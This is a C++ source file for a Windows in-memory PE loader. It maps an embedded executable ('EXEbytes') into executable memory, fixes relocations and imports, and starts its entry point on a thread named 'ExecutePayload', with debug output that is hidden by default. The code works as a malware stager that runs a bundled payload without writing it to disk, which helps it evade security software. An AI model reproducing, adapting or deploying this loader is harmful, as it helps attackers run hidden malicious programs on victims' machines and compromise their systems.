#include <windows.h>
#include <iostream>

#ifdef DEBUG_CONSOLE
    #define DEBUG_PRINT(x) std::cout << x << std::endl
#else
    #define DEBUG_PRINT(x)
#endif

extern unsigned char EXEbytes[];
extern size_t EXEbytesSize;

struct PayloadData
{
    LPVOID entryPoint;
    BYTE* baseAddress;
};

DWORD WINAPI ExecutePayload(LPVOID param)
{
    PayloadData* data = (PayloadData*)param;
    
    DEBUG_PRINT("[+] Payload thread started");
    
    typedef int (*EntryPointFunc)();
    EntryPointFunc entry = (EntryPointFunc)data->entryPoint;
    
    int result = entry();
    
#ifdef DEBUG_CONSOLE
    std::cout << "[+] Payload returned with code: " << result << std::endl;
#endif
    
    delete data;
    return result;
}

void loadbytes()
{
    DEBUG_PRINT("[*] Starting PE loader...");
    DEBUG_PRINT("[*] EXE size: " << EXEbytesSize << " bytes");
    
    BYTE* exeData = EXEbytes;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)exeData;
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        DEBUG_PRINT("[!] Invalid DOS signature");
        return;
    }
    DEBUG_PRINT("[+] DOS header valid");

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(exeData + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE)
    {
        DEBUG_PRINT("[!] Invalid NT signature");
        return;
    }
    DEBUG_PRINT("[+] NT header valid");

    SIZE_T size = nt->OptionalHeader.SizeOfImage;
    DEBUG_PRINT("[*] Image size: " << size << " bytes");
    
    BYTE* mem = (BYTE*)VirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mem)
    {
        DEBUG_PRINT("[!] VirtualAlloc failed");
        return;
    }
    
#ifdef DEBUG_CONSOLE
    std::cout << "[+] Memory allocated at: 0x" << std::hex << (ULONG_PTR)mem << std::dec << std::endl;
#endif

    memcpy(mem, exeData, nt->OptionalHeader.SizeOfHeaders);
    DEBUG_PRINT("[+] Headers copied");

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if (sec->SizeOfRawData)
        {
#ifdef DEBUG_CONSOLE
            std::cout << "[*] Copying section: " << (char*)sec->Name << std::endl;
#endif
            memcpy(mem + sec->VirtualAddress, exeData + sec->PointerToRawData, sec->SizeOfRawData);
        }
    }

    ULONG_PTR delta = (ULONG_PTR)(mem - nt->OptionalHeader.ImageBase);
    if (delta && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
    {
#ifdef DEBUG_CONSOLE
        std::cout << "[*] Processing relocations (delta: 0x" << std::hex << delta << std::dec << ")" << std::endl;
#endif
        
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(mem +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        SIZE_T processed = 0;
        
        while (processed < nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size)
        {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* list = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < count; i++)
            {
                WORD type_offset = list[i];
                WORD type = type_offset >> 12;
                WORD offset = type_offset & 0xFFF;
                BYTE* addr = mem + reloc->VirtualAddress + offset;

                if (type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)addr += (DWORD)delta;
                else if (type == IMAGE_REL_BASED_DIR64)
                    *(ULONGLONG*)addr += delta;
            }
            
            processed += reloc->SizeOfBlock;
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
        DEBUG_PRINT("[+] Relocations processed");
    }

    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
    {
        DEBUG_PRINT("[*] Resolving imports...");
        
        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(mem +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        
        while (imp->Name)
        {
            char* modName = (char*)(mem + imp->Name);
#ifdef DEBUG_CONSOLE
            std::cout << "[*] Loading library: " << modName << std::endl;
#endif
            
            HMODULE lib = LoadLibraryA(modName);
            if (!lib)
            {
                DEBUG_PRINT("[!] Failed to load library: " << modName);
                return;
            }

            PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(mem + imp->FirstThunk);
            PIMAGE_THUNK_DATA orig = imp->OriginalFirstThunk ?
                (PIMAGE_THUNK_DATA)(mem + imp->OriginalFirstThunk) : thunk;

            while (orig->u1.AddressOfData)
            {
                FARPROC proc = nullptr;
                
                if (orig->u1.Ordinal & IMAGE_ORDINAL_FLAG)
                {
                    proc = GetProcAddress(lib, (LPCSTR)(orig->u1.Ordinal & 0xFFFF));
                }
                else
                {
                    PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(mem + orig->u1.AddressOfData);
                    proc = GetProcAddress(lib, name->Name);
                }

                if (!proc)
                {
                    DEBUG_PRINT("[!] Failed to resolve import");
                    return;
                }
                
                thunk->u1.Function = (ULONGLONG)proc;

                ++thunk;
                ++orig;
            }

            ++imp;
        }
        DEBUG_PRINT("[+] Imports resolved");
    }

    FlushInstructionCache(GetCurrentProcess(), mem, size);

    DWORD epRVA = nt->OptionalHeader.AddressOfEntryPoint;
#ifdef DEBUG_CONSOLE
    std::cout << "[*] Entry point RVA: 0x" << std::hex << epRVA << std::dec << std::endl;
#endif
    
    PayloadData* data = new PayloadData;
    data->entryPoint = (LPVOID)(mem + epRVA);
    data->baseAddress = mem;
    
    DEBUG_PRINT("[+] Creating payload thread...");
    
    HANDLE hThread = CreateThread(NULL, 0, ExecutePayload, data, 0, NULL);
    
    if (hThread)
    {
        DEBUG_PRINT("[+] Payload thread created successfully");
        
#ifdef DEBUG_CONSOLE
        std::cout << "[*] Thread handle: 0x" << std::hex << (ULONG_PTR)hThread << std::dec << std::endl;
        std::cout << "[*] Waiting for payload to initialize..." << std::endl;
        Sleep(3000); 
#endif
        
    }
    else
    {
        DEBUG_PRINT("[!] Failed to create payload thread");
        delete data;
        VirtualFree(mem, 0, MEM_RELEASE);
    }
    
    DEBUG_PRINT("[*] PE loader finished");
}